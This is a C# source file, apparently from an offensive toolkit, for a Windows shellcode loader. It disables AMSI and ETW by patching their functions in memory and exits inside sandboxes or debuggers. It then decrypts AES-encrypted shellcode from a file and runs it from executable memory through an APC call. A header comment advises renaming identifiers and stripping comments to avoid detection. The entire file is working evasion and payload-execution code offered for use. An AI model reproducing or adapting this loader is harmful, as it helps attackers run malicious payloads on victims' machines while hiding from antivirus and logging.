/* Important notes: 
- This version is voluntary not obfuscated. 
- Namespace/Class/function/variable names should be changed and all comments and console output messages must be deleted or modified before compiling this file.
*/
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Security;
using System.Security.Cryptography;
using System.IO;

namespace  CsharpShellCodeLoader
{

    class Program
    {
		
	  [DllImport("ntdll.dll")]
	   public static extern NTSTATUS NtTestAlert();

	  [DllImport("kernel32.dll")]
	   public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType,  AllocationProtect flProtect);

	  [DllImport("kernel32.dll")]
	   public static extern IntPtr GetCurrentThread();

	  [DllImport("kernel32.dll", SetLastError = true)]
	   public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);	

      [DllImport("kernel32.dll")]
       static extern void Sleep(uint dwMilliseconds);

      [DllImport("kernel32")]
	   public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

      [DllImport("kernel32")]
	   public static extern IntPtr LoadLibrary(string name);
	
      [DllImport("kernel32.dll")]
	   public static extern IntPtr GetModuleHandle(string lpModuleName);

      [DllImport("kernel32")]
	   public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

      [DllImport("kernel32.dll")]
	   public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

      [DllImport("kernel32.dll", SetLastError = true)]
	   private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

	   
	   public enum NTSTATUS : uint {
            Success = 0,
            Informational = 0x40000000,
            Error = 0xc0000000
        }

	   public enum AllocationProtect : uint {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        // Basic SandBox evasion checks
        public static void BasicSandBoxEvasion(string MyDomainName)
        {
          // Defense evasion: Exit the program if it is running on a computer that is not joined to a domain
            if (string.Equals(MyDomainName, System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase))
            {
				//Go on
				Console.WriteLine("Domain name check is Ok -> " + System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName);
            }
			else
			{
				return;
			}
            // Defense evasion: Exit the program if a debugger is attached
			if (System.Diagnostics.Debugger.IsAttached)
			{
				return;
			}
        }

        // Decrypting the AES encrypted shellcode 
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passkeyBytes)
        {
			byte[] decryptedBytes = null;
			byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

			using (MemoryStream ms = new MemoryStream())
			{
				using (RijndaelManaged AES = new RijndaelManaged())
				{
					AES.KeySize = 256;
					AES.BlockSize = 128;

					var key = new Rfc2898DeriveBytes(passkeyBytes, saltBytes, 1000);
					AES.Key = key.GetBytes(AES.KeySize / 8);
					AES.IV = key.GetBytes(AES.BlockSize / 8);

					AES.Mode = CipherMode.CBC;

					using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
						cs.Close();
					}
					decryptedBytes = ms.ToArray();
				}
			}

			return decryptedBytes;
		}
		
        // AMSI patching 		
		public static void PatchAmsi()
		{
			IntPtr lib = LoadLibrary("ams"+"i.dl"+"l");
			IntPtr aammssii = GetProcAddress(lib, "A"+"msiSc"+"anBu"+"ffe"+"r");
			IntPtr final = IntPtr.Add(aammssii, 0x95);
			uint old = 0;
			VirtualProtect(final, (UInt32)0x1, 0x40, out old);
			byte[] patch = new byte[] { 0x75 };
			Marshal.Copy(patch, 0, final, 1);
		}	
		
        // ETW patching 		
		public static void PatchEtw()
		{
			const uint PAGE_EXECUTE_READWRITE = 0x40;
			string ntdllModuleName = "ntdll.dll";
			string etwEventWriteFunctionName = "EtwEventWrite";

			IntPtr ntdllModuleHandle = GetModuleHandle(ntdllModuleName);
			IntPtr etwEventWriteAddress = GetProcAddress(ntdllModuleHandle, etwEventWriteFunctionName);

			byte[] retOpcode = { 
			0xC3 
			};

			uint oldProtect;
			VirtualProtect(etwEventWriteAddress, (UIntPtr)retOpcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
			
			int bytesWritten;
			WriteProcessMemory(Process.GetCurrentProcess().Handle, etwEventWriteAddress, retOpcode, (uint)retOpcode.Length, out bytesWritten);
		}

        static void Main(string[] args)
        {
			// Exit if no argument and do not provide information except "Missing arguments".
			if (args.Length < 1)
			{
				Console.WriteLine("Missing arguments.");
				Environment.Exit(0);
			}
			
			// The first argument is the joined domain name of the target Windows machine (input for the Sandbox evasion check)
			string CheckMyDomainName = args[0];
			BasicSandBoxEvasion(CheckMyDomainName);
			
			// A-M-S-I & E-T-W patching
			PatchAmsi();
			PatchEtw();
		
			// The second argument is the path to the file containing your aes encrypted shellcode encoded in base 64 (i.e., .\path\file.txt or C:\path\file.txt)
			string encodedfilepath = args[1];
			string encodedfile = File.ReadAllText(encodedfilepath);
			byte[] aesencryptedshellcode = Convert.FromBase64String(encodedfile);
			
			// The third argument is the AES passkey 
			string passkey = args[2];
			byte[] passkeyBytes = Encoding.UTF8.GetBytes(passkey);
			passkeyBytes = SHA256.Create().ComputeHash(passkeyBytes);
			
			byte[] buffer = AES_Decrypt(aesencryptedshellcode, passkeyBytes);
            IntPtr funcAddr = VirtualAlloc(0, (UInt32)buffer.Length, 0x1000, AllocationProtect.PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buffer, 0, (IntPtr)(funcAddr), buffer.Length);
            IntPtr CurrentThread_hanlde = GetCurrentThread();
            QueueUserAPC(funcAddr, CurrentThread_hanlde, 0);
            NtTestAlert();
        }
    }
}
